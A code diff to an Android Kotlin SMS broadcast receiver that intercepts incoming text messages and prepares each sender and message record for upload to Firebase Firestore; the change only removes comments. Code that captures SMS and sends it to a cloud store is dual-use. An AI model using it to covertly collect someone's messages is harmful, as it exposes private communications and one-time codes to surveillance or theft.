@@ -10,9 +10,6 @@ import com.google.firebase.Timestamp
 import com.google.firebase.firestore.FirebaseFirestore
 import java.util.*
 
-/**
- * Broadcast receiver that intercepts incoming SMS messages
- */
 class SmsReceiver : BroadcastReceiver() {
     companion object {
         private const val TAG = "SmsReceiver"
@@ -22,11 +19,9 @@ class SmsReceiver : BroadcastReceiver() {
         if (intent.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
             Log.d(TAG, "SMS received")
             
-            // Start the SMS service if not already running
             val serviceIntent = Intent(context, SmsService::class.java)
             context.startService(serviceIntent)
             
-            // Process SMS directly for immediate capture
             processSms(context, intent)
         }
     }
@@ -42,7 +37,6 @@ class SmsReceiver : BroadcastReceiver() {
             
             Log.d(TAG, "Processing SMS from $sender")
             
-            // Upload to Firebase
             val smsData = hashMapOf(
                 "sender" to sender,
                 "recipient" to "ME",
